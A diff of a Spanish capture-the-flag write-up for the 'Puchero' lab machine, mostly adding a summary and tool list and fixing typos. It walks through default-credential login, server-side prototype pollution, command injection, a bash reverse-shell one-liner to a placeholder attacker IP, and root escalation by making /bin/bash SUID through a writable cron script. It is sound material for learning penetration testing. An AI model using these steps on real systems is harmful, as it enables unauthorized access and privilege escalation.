@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Puchero - TheHackerLabs
-excerpt: "."
+excerpt: "Esta fue una máquina algo complicada. Después de analizar los escaneos, pasamos a analizar las páginas web activas, pero nos enfocamos en la que muestra un login en el puerto 3333. Logrando pasar el login utilizando credenciales por defecto, analizamos el comportamiento de la página admin, que nos permite cargarle una URL y descargar algo. Descubrimos que es posible que sea vulnerable a Server Side Prototype Pollution, pues está ocupando Node JS Express, siendo un framework vulnerable a esto. Probamos y aplicamos un payload que nos da privilegios de administrador, lo que nos permite utilizar de manera funcional la página admin. Además, probamos que también es vulnerable a ejecución de comandos, pues está utilizando la función exec(), siendo una función vulnerable. Aprovechamos esto para obtener una Reverse Shell y al fin conectarnos a la máquina víctima. Dentro, utilizamos la herramienta pspy64 para identificar tareas CRON en segundo plano. Identificamos que se ejecuta un script vacío cada minuto y que podemos modificar. Modificamos el script para que, cuando se ejecute, cambie los permisos de la Bash por permisos SUID y así la podamos ejecutar con privilegios de Root, lo que nos permite escalar privilegios y convertirnos en Root."
 date: 2025-06-13
 classes: wide
 header:
@@ -25,17 +25,27 @@ tags:
   - Privesc - Abusing CRON Jobs
   - OSCP Style
 ---
-![](/assets/images/THL-writeup-puchero/puchero.png)
+<p align="center">
+<img src="/assets/images/THL-writeup-puchero/puchero.png">
+</p>
 
-texto
+Esta fue una máquina algo complicada. Después de analizar los escaneos, pasamos a analizar las páginas web activas, pero nos enfocamos en la que muestra un login en el **puerto 3333**. Logrando pasar el login utilizando credenciales por defecto, analizamos el comportamiento de la **página admin**, que nos permite cargarle una URL y descargar algo. Descubrimos que es posible que sea vulnerable a **Server Side Prototype Pollution**, pues está ocupando **Node JS Express**, siendo un framework vulnerable a esto. Probamos y aplicamos un payload que nos da privilegios de administrador, lo que nos permite utilizar de manera funcional la **página admin**. Además, probamos que también es vulnerable a ejecución de comandos, pues está utilizando la función `exec()`, siendo una función vulnerable. Aprovechamos esto para obtener una **Reverse Shell** y al fin conectarnos a la máquina víctima. Dentro, utilizamos la herramienta **pspy64** para identificar **tareas CRON** en segundo plano. Identificamos que se ejecuta un script vacío cada minuto y que podemos modificar. Modificamos el script para que, cuando se ejecute, cambie los **permisos de la Bash** por **permisos SUID** y así la podamos ejecutar con privilegios de **Root**, lo que nos permite escalar privilegios y convertirnos en **Root**.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *BurpSuite*
+* *echo*
+* *python3*
+* *tcpdump*
+* *nc*
+* *bash*
+* *grep*
+* *cat*
+* *pspy64*
+* *wget*
+* *chmod*
+* *nano*
 
 
 <br>
@@ -271,7 +281,7 @@ Algo que siempre hay que probar, son credenciales por defecto, por ejemplo, con 
 Podríamos probar las contraseñas:
 * `pass`
 * `admin`
-* 12345`
+* `12345`
 * `password`
 * Y muchas más...
 
@@ -289,7 +299,7 @@ Veamos el código fuente:
 <img src="/assets/images/THL-writeup-puchero/Captura8.png">
 </p>
 
-Al darle una URL, se guarda en el parámetro url y se analiza con la función `check_url()`. Esta función toma la URL que introduzcamos, la envia por petición POST a `/admin/check_ulr` y muestra la respuesta que se obtuvo de la petición, en una ventana emergente con `alert()`.
+Al darle una URL, se guarda en el parámetro url y se analiza con la función `check_url()`. Esta función toma la URL que introduzcamos, la envía por petición POST a `/admin/check_ulr` y muestra la respuesta que se obtuvo de la petición, en una ventana emergente con `alert()`.
 
 Tratemos de enviarle una URL de un archivo de texto con contenido random, que será almacenado en un servidor de **Python** en nuestra máquina. 
 
@@ -322,7 +332,7 @@ Y más específicamente, al **Server Side Prototype Pollution**.
 Lo sabemos porque se está utilizando **NodeJS Express Framework**, que puede ser vulnerable al **Server Side Prototype Pollution**.
 
 Aquí dejo un blog que explica esta vulnerabilidad y como es posible detectarla:
-* <a href="https://www.yeswehack.com/learn-bug-bounty/server-side-prototype-pollution-how-to-detect-and-exploit" target="_blank"></a>
+* <a href="https://www.yeswehack.com/learn-bug-bounty/server-side-prototype-pollution-how-to-detect-and-exploit" target="_blank">Server side prototype pollution, how to detect and exploit</a>
 
 Solo aplicaremos esta prueba, pues también es probable que rompamos la página web:
 
@@ -433,7 +443,7 @@ Utiliza la siguiente en la petición:
 bash -c 'bash -i >& /dev/null/Tu_IP/443 0>&1'
 ```
 
-Recuerda **URL encodear** todo este comando y luego envialo:
+Recuerda **URL encodear** todo este comando y luego envíalo:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-puchero/Captura16.png">
@@ -450,7 +460,7 @@ puchero@puchero:/var/www/html/PrototypePollution-Lab/prototypePoluttion$ whoami
 <l/PrototypePollution-Lab/prototypePoluttion$ whoami
 puchero
 ```
-Estamos dentro y somo el **usuario puchero**.
+Estamos dentro y somos el **usuario puchero**.
 
 Obtengamos una sesión interactiva:
 ```bash
@@ -494,7 +504,7 @@ drwxr-xr-x 53 puchero puchero  4096 may 21  2024 node_modules
 -rw-r--r--  1 puchero root      254 abr 12  2024 server.js
 ```
 
-Resulta que si es vulnerable a ejecución de comandos, pues se esta ocupando la función `exec()`:
+Aquí podemos ver cómo es que es vulnerable a la ejecución de comandos, pues se está ocupando la función `exec()`:
 ```bash
 puchero@puchero:/var/www/html/PrototypePollution-Lab/prototypePoluttion$ cat routes.js | grep exec
 const { exec } = require("child_process");
@@ -515,7 +525,7 @@ Continuemos.
 
 <h2 id="linEnum">Enumeración de Máquina Víctima</h2>
 
-Vamos a movernos al directorio del usuario puchero:
+Vamos a movernos al directorio del **usuario puchero**:
 ```bash
 puchero@puchero:/var/www/html$ cd /home/puchero
 puchero@puchero:~$
@@ -539,17 +549,16 @@ drwxr-xr-x 18 root root    4096 abr 12  2024 ..
 puchero@puchero:~$ cat /opt/grasioso.sh
 puchero@puchero:~$
 ```
-
-Te diría que utilices la herramienta **linpeas.sh**, para buscar alguna vulnerabilidad, pero en mi caso, no encontre ninguna cuando lo ocupe, pero si vi algo interesante, las **tareas CRON**.
+Te diría que utilices la herramienta **linpeas.sh**, para buscar alguna vulnerabilidad, pero en mi caso, no encontré ninguna cuando lo ocupé, pero sí vi algo interesante, las **tareas CRON**.
 
 Vamos a utilizar la herramienta **pspy**, para verlas con más detalle.
 
 Puedes descargarlo de aquí:
 <a href="https://github.com/DominicBreuker/pspy" target="_blank">Repositorio de DominicBreuker: pspy</a>
 
-Descarga la versión 64 de la sección **Releases**.
+Descarga la versión **pspy64** de la sección **Releases**.
 
-Una vez que lo descargues, envialo a la máquina víctima, abriendo un servidor con Python y utilizando wget para descargarlo:
+Una vez que lo descargues, envíalo a la máquina víctima, abriendo un servidor con **Python** en tu máquina y utilizando **wget** para descargarlo:
 ```bash
 puchero@puchero:~$ wget http://Tu_IP/pspy64
 ```
@@ -572,7 +581,7 @@ Esperando un par de minutos, podemos ver lo siguiente:
 2025/06/14 04:20:01 CMD: UID=0     PID=17573  | /bin/sh -c /bin/bash -c /opt/grasioso.sh 
 2025/06/14 04:20:01 CMD: UID=0     PID=17574  |
 ```
-El **usuario Root** (**UID=0**) esta ejecutando una **tarea CRON**, que ejecuta cada minuto el script **grasioso.sh** que encontramos en el directorio `/opt`.
+El **usuario Root** (**UID=0**) está ejecutando una **tarea CRON**, que ejecuta cada minuto el script **grasioso.sh** que encontramos en el directorio `/opt`.
 
 Se me ocurre utilizar este script para darle **permisos SUID** a la **Bash**.
 
@@ -585,9 +594,9 @@ Primero, veamos los permisos de la **Bash**:
 puchero@puchero:~$ ls -la /bin/bash
 -rwxr-xr-x 1 root root 1265648 abr 23  2023 /bin/bash
 ```
-Solamente tiene permisos de ejecución especificos.
+Solamente tiene permisos de ejecución específicos.
 
-Modifiquemos el script **grasioso.sh** para que ejecute **chmod** y le de **permisos SUID** a la **Bash**:
+Modifiquemos el script **grasioso.sh** para que ejecute **chmod** y le dé **permisos SUID** a la **Bash**:
 ```bash
 puchero@puchero:~$ nano /opt/grasioso.sh
 ------------------
@@ -609,7 +618,7 @@ root
 ```
 Listo, somos **Root**.
 
-Podemos comprobar la **tarea CRON** que esta ejecutando el **Root**:
+Podemos comprobar la **tarea CRON** que está ejecutando el **Root**:
 ```bash
 bash-5.2# cat /var/spool/cron/crontabs/root
 ...
